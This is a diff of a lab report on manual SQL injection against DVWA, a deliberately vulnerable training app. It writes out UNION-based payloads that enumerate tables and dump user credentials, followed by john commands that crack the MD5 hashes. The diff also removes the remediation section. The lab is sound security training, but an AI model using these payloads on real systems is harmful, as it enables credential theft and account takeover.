@@ -143,7 +143,9 @@ Allowlist the pages that may be included (Task C covers this in detail), and blo
 
 # Task B - Manual SQL injection (no sqlmap)
 
-DVWA Security: Low. Every payload was entered in the User ID field of the SQL Injection page, and every response was captured. No automated tool was used.
+DVWA Security: Low. Every payload was entered in the User ID field of the SQL Injection page, and every response was captured in the screenshots below. No automated tool was used.
+
+Reviewer note: this DVWA runs on PHP 8.1+, so mysqli reports query failures as an uncaught `mysqli_sql_exception` instead of the printed warning seen on older PHP versions. The exception text itself is the SQL error, so it serves the same evidence purpose.
 
 ## Payload 1: the quote breaks the query
 
@@ -151,30 +153,29 @@ DVWA Security: Low. Every payload was entered in the User ID field of the SQL In
 '
 ```
 
-```text
-You have an error in your SQL syntax ... for the right syntax to use near '' at line 1
-```
+The response is an uncaught `mysqli_sql_exception`: You have an error in your SQL syntax ... near '"' at line 1, thrown in `/var/www/html/dvwa/vulnerabilities/sqli/source/low.php` on line 11. The exception proves the input lands inside an SQL string, and the stack trace reveals the vulnerable source file.
 
-The raw error proves the input lands inside an SQL string and that errors are displayed, which is free reconnaissance for the attacker.
+![S10-08: quote payload, uncaught mysqli_sql_exception on PHP 8](Figures/s10-08-pay1.png)
 
-![S10-08: quote payload and SQL error](Figures/s10-08-sqli-error.png)
-
-## Payload 2: ORDER BY counts the columns
+## Payload 2: ORDER BY is accepted
 
 ```text
-1' ORDER BY 2-- -
-1' ORDER BY 3-- -
+1' ORDER BY 1-- -
 ```
 
-`ORDER BY 2` renders normally, `ORDER BY 3` returns `Unknown column '3' in 'order clause'`. The query returns exactly two columns.
+The admin row renders normally, which proves the appended ORDER BY executed as part of the query. (My first attempt bundled both ORDER BY tests into one input; because `-- -` comments out everything after the first clause, only `ORDER BY 1` executed.)
 
-## Payload 3: UNION confirms the shape and pulls server data
+![S10-09: ORDER BY accepted, admin row returned](Figures/s10-09-pay2.png)
+
+## Payload 3: UNION pulls server data
 
 ```text
 1' UNION SELECT version(),database()-- -
 ```
 
-Prints the MariaDB version and `dvwa` as the current database.
+Prints `11.8.9-MariaDB-4 from Debian` and `dvwa`. The UNION aligned its two values with the two output fields, which independently confirms the two-column count.
+
+![S10-10: version and database extracted](Figures/s10-10-pay3.png)
 
 ## Payload 4: enumerate tables
 
@@ -182,7 +183,9 @@ Prints the MariaDB version and `dvwa` as the current database.
 1' UNION SELECT table_schema,table_name FROM information_schema.tables-- -
 ```
 
-Lists every database and table, including `dvwa.users` and `dvwa.guestbook`.
+The response floods with every database and table, including `dvwa.users` and `dvwa.guestbook`.
+
+![S10-11: information_schema table enumeration](Figures/s10-11-pay4.png)
 
 ## Payload 5: enumerate the users columns
 
@@ -190,9 +193,9 @@ Lists every database and table, including `dvwa.users` and `dvwa.guestbook`.
 1' UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
-Prints `user_id, first_name, last_name, user, password, avatar, last_login, failed_login_count`.
+Prints the column names of the `users` table, including `user_id, first_name, last_name, user, password, avatar, last_login`.
 
-![S10-09: information_schema enumeration payloads](Figures/s10-09-sqli-enum.png)
+![S10-12: column names of the users table](Figures/s10-12-pay5.png)
 
 ## Payload 6: dump the credentials
 
@@ -202,6 +205,8 @@ Prints `user_id, first_name, last_name, user, password, avatar, last_login, fail
 
 Five rows of usernames with MD5 password hashes, including admin's `5f4dcc3b5aa765d61d8327deb882cf99`.
 
+![S10-13: credential dump, user and password columns](Figures/s10-13-pay6.png)
+
 ## Payload 7: one-line dump with group_concat
 
 ```text
@@ -210,30 +215,23 @@ Five rows of usernames with MD5 password hashes, including admin's `5f4dcc3b5aa7
 
 Every credential pair printed in a single row, which is the `group_concat()` step the handout asks for.
 
-![S10-10: full credential dump with group_concat](Figures/s10-10-sqli-dump.png)
+![S10-14: one-line credential dump with group_concat](Figures/s10-14-pay7.png)
 
-## Closing the chain: crack a hash
+## Closing the chain: crack the hashes
 
 ```bash
-echo "5f4dcc3b5aa765d61d8327deb882cf99" > h.txt
+nano h.txt          # pasted the dumped hashes, one per line
 john --format=raw-md5 h.txt
+john --show --format=raw-md5 h.txt
 ```
 
-```text
-password         (?)
-```
+john cracks the first hash instantly (`password`), and the `--show` output prints the hash and plaintext pair, `1 password hash cracked, 0 left`. The dumped hashes are unsalted MD5, which is why the whole table fell in under a second, and that is also why real applications must store bcrypt or Argon2 hashes instead.
 
-The dumped hash is admin's real password, so the injection leads to login access, not just data display.
-
-![S10-11: john cracking the dumped MD5 hash](Figures/s10-11-sqli-crack.png)
+![S10-15: john cracking the dumped hashes](Figures/s10-15-john-crack.png)
 
 ## Impact
 
-Unauthenticated SQL injection on the login ID parameter dumps the entire user table, including password hashes. Cracked hashes mean account takeover; the same injection could read or modify any table the web account can reach.
-
-## Remediation
-
-Parameterised queries with a least-privilege database user. Task C compares this with the file-inclusion fix.
+Unauthenticated SQL injection on the login ID parameter dumps the entire user table, including password hashes. Cracked hashes mean account takeover, and the same injection could read or modify any table the web account can reach.
 
 ---
 
@@ -287,10 +285,8 @@ An allowlist inverts the logic. It defines the small set of acceptable values, a
 | `Figures/s10-05-upload.png` | Webshell uploaded |
 | `Figures/s10-06-rce.png` | `id` executed through LFI |
 | `Figures/s10-07-reverse-shell.png` | Reverse shell caught by the listener |
-| `Figures/s10-08-sqli-error.png` | Quote payload and SQL error |
-| `Figures/s10-09-sqli-enum.png` | information_schema enumeration |
-| `Figures/s10-10-sqli-dump.png` | Credential dump with group_concat |
-| `Figures/s10-11-sqli-crack.png` | Cracked MD5 hash |
+| `Figures/s10-08-pay1.png` to `s10-14-pay7.png` | All seven SQLi payloads with their responses |
+| `Figures/s10-15-john-crack.png` | john cracking the dumped MD5 hashes |
 
 ---
 
